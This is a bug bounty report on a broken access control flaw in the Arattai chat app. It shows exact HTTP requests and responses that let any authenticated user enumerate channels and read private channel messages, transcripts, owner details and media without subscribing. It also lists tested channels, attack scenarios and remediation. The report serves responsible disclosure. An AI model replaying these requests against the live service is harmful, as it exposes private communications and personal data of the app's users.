# Bug Bounty Report: Channel Message IDOR — Read Any Channel Without Subscription

## Title
Broken Access Control on Channel Messages API Allows Any Authenticated User to Read All Channel Messages Including Private/Internal Channels

## Severity
**HIGH** (CVSS 3.1: 6.5 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

Note: Contextual severity is **Critical** given that private business communications, financial data, and internal company channels are all exposed across three independent API surfaces with no rate limiting.

## Affected Component
- Arattai Android App v1.54.0 (com.aratai.chat)
- API: `GET https://chat.arattai.in/api/v2/chats/{chat_id}/messages`
- API: `GET https://chat.arattai.in/api/v1/chats/{chat_id}`
- API: `GET https://chat.arattai.in/v1/chats/{chat_id}/media`

## Summary
The channel messages API (`/api/v2/chats/{chat_id}/messages`) performs **no server-side authorization check** to verify whether the requesting user is a subscriber of the channel. Any authenticated user who knows a channel's ID can read its complete message history, including private and internal channels they have never joined.

Channel IDs are trivially discoverable via the `/v1/usernames/{name}` username lookup endpoint, making this a full access control bypass.

## Steps to Reproduce

### Step 1: Discover Channel IDs via Search or Username Lookup

Channel IDs are discoverable via the authenticated search endpoint:
```http
GET /v1/usernames?type=channel&search=internal HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted>
User-Agent: ArattaiAndroid/1.54.0
```

Or via direct username lookup:
```http
GET /v1/usernames/internal HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted>
User-Agent: ArattaiAndroid/1.54.0
```

Response:
```json
{
  "data": {
    "id": "CT_1290406159568267434_20018042216-PC",
    "subscribers_count": 2,
    "title": "Greytheta",
    "joined": false
  }
}
```

Note: `joined: false` — the requesting user is NOT a subscriber.

### Step 2: Read Messages Without Being Subscribed
```http
GET /api/v2/chats/CT_1290406159568267434_20018042216-PC/messages?limit=5 HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted>
User-Agent: ArattaiAndroid/1.54.0
```

Response (200 OK):
```json
{
  "data": [
    {
      "sender": {"id": "CT_1290406159568267434_20018042216-PC"},
      "type": "text",
      "content": {"text": "Internal grey theta ki"},
      "time": 1760004149781
    }
  ]
}
```

### Step 3: Get Channel Metadata (Owner PII)
```http
GET /api/v1/chats/CT_1290406159568267434_20018042216-PC HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted>
User-Agent: ArattaiAndroid/1.54.0
```

Response:
```json
{
  "data": {
    "owner": {"name": "[REDACTED_NAME_1]", "id": "[REDACTED_UID]"},
    "pcount": 2,
    "chat_type": 8,
    "joined": false
  }
}
```

### Step 4: Read Full Channel Transcript
```http
GET /api/v2/chats/CT_1290406159568267434_20018042216-PC/transcript HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted>
User-Agent: ArattaiAndroid/1.54.0
```

Response (200 OK) includes complete message history with sender display names, view counts, and timestamps.

### Step 5: List All Shared Media Files
```http
GET /v1/chats/CT_1280851043156911048_2612706-PC/media?limit=5 HTTP/1.1
Host: chat.arattai.in
Authorization: Zoho-oauthtoken <redacted>
User-Agent: ArattaiAndroid/1.54.0
```

Response includes file names, sender real names and IDs, file IDs, and base64 thumbnails.

## Tested Channels (All Confirmed Vulnerable)

| Channel Username | Subscribers | joined | Messages Read | Owner Leaked |
|---|---|---|---|---|
| `support` | 1 | false | Internal support tickets with employee names | YES |
| `internal` | 2 | false | Internal company communications | YES |
| `finance` | 4 | false | Financial planning content | YES |
| `private` | 1 | false | Private channel messages | YES |
| `cricket` | 17,340 | false | Full message history with images | YES |
| `news` | 78 | false | Daily news digests | YES |
| `engineering` | 7 | false | Engineering channel creation info | YES |
| `Health and Nutrition` | 23,908 | false | Health content (10KB response) | YES |

Additionally, the channel search endpoint (`GET /v1/usernames?type=channel&search={term}`) returns up to 50 results per search term. Tested search terms returned: "bank" (38), "marketing" (50), "health" (50), "education" (50), "product" (40) — demonstrating that hundreds of channels are trivially discoverable.

Real names and UIDs of channel owners found in responses are available on request but redacted here for responsible disclosure.

## Impact

### Confidentiality Breach
- **Read private business communications**: Internal channels used for company discussions, HR, finance, engineering are fully accessible
- **Access all shared files**: Documents, images, videos shared in any channel
- **Harvest PII**: Real names and Zoho UIDs of channel owners, message senders
- **No rate limiting**: Bulk message extraction possible at scale

### Attack Scenarios
1. **Corporate espionage**: Access competitor's internal Arattai channels by guessing common names ("internal", "engineering", "finance", "sales")
2. **Data harvesting**: Enumerate channels via dictionary attack on `/v1/usernames/{name}`, then bulk-download all messages
3. **Targeted intelligence**: Find a specific organization's channel, read all internal communications
4. **PII collection**: Harvest real names of users from channel ownership and message sender data

## Root Cause
The `/api/v2/chats/{chat_id}/messages` endpoint validates authentication (OAuth token) but does **not verify channel membership**. The server should check that the requesting user's ID is in the channel's subscriber list before returning messages.

## Remediation
1. **Server-side authorization**: Check channel membership before returning messages
2. **Rate limit** username lookups to prevent channel enumeration
3. **Access control on channel metadata**: Don't expose owner names and subscriber counts to non-members
4. **Audit logging**: Log and alert on unusual channel access patterns

## Environment
- App: Arattai v1.54.0 (com.aratai.chat)
- Android: API 35 (emulator, x86_64)
- Date: 2026-10-05
